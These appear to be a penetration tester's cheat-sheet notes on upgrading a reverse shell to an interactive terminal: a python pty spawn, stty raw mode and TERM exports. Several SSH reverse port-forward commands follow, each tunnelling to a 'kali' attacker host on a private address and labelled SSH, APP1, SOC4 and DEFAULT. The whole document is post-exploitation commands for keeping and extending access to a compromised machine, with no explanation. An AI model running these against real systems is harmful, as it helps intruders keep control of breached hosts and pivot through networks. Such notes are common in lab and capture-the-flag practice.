# Upgrading Reverse Shell


```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

`(Ctl + z)` 

```
stty raw -echo; fg
```

```
xterm-256color 
```

```
export TERM=xterm-256color 
```

```
export SHELL=/bin/bash
```

```
stty rows 27 columns 77
```

### SSH

```
ssh -N -f -R 127.0.0.1:9080 127.0.0.1:9080 kali@192.168.122.209 -p 55555
```

### APP1

```
ssh -N -f -R 127.0.0.1:9080 127.0.0.1:9080 kali@192.168.122.209 -p 55556
```

### SOC4

```
ssh -N -f -R 127.0.0.1:9080 127.0.0.1:9080 kali@192.168.122.209 -p 55557
```

### DEFAULT

```
ssh -N -f -R 127.0.0.1:9080 127.0.0.1:9080 kali@192.168.122.209 -p 61775
```
